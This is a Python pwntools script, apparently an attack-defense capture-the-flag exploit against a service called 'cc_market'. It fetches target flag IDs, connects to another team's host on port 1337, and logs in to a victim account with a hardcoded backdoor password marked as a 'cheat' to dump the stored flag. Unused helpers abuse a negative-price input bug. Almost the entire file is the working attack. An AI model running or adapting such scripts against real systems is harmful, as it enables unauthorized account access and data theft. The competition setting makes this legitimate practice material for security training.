#!/usr/bin/env python3

from pwn import remote 
import sys 
import json  
import subprocess
import requests

#cheat ADOIFNOJSDAN
#ip = "10.60.81.1"
ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=cc_market&team={ip}") 
data = json.loads(response.text)
us = data["cc_market"]
us = us[ip]
us = us  
CreoVendoCompro = 1
User = 1
username = "CookieMan"

def CreoVendoCompro():
    r.sendline("2")
    print(r.recvuntil("note?"))
    r.sendline("CookiesAreBack1")
    print(r.recvuntil("note?"))
    r.sendline("-9999999999")
    print(r.recvuntil("note:"))
    r.sendline("CookiesAreSooGood!!!")
    print(r.recvuntil("EOF"))
    r.sendline("EOF")
    print(r.recvuntil("(y/n)?"))
    r.sendline("n")
    print(r.recvuntil("Back"))
def AddUser():
    r.sendline("1")
    r.recvuntil("Username:")
    r.sendline(username)
    r.recvuntil("Password:")
    r.sendline("Cookie")
    r.recvuntil("Description:")
    r.sendline("CookieAreGood")
    r.recvuntil(">")
def getPassword():
    dump = r.recvuntil("buy?")
    for i in dump.split(b"\n")[2:-1]:
        flag = i.split(b"\t")
        print(flag)
        if int(flag[2]) < 1000:
            print(flag)
            r.sendline(flag[0])
            passw = r.recvuntil(">")
            print(passw)
            passw = passw.split(b"+++")
            passw = passw[1].split(b"See you!")
            passw = passw[0]
            return passw

# Connect to the server
r = remote(ip, 1337)


r.recvuntil(">")
if (User == 0):
    AddUser()
"""r.sendline("2")
r.recvuntil("Username:")
r.sendline(username)
r.recvuntil("Password:")
r.sendline("Cookie")
r.recvuntil(">")
if (CreoVendoCompro == 0):
    CreoVendoCompro()
r.sendline("6")

with open(file, "r") as f:
    data = json.load(f)
    us = data["cc_market"]
    us = us[ip]
    us = us
"""
pw = "ADOIFNOJSDAN"
r.sendline("2")
r.recvuntil("Username:")
r.sendline(us[-1])
r.recvuntil("Password:")
r.sendline(pw)
r.recvuntil(">")
r.sendline("6")
dump = r.recvuntil("buy?")
dump = dump.split(b"----")
flag = dump[1]
print(flag, flush=True)
r.close()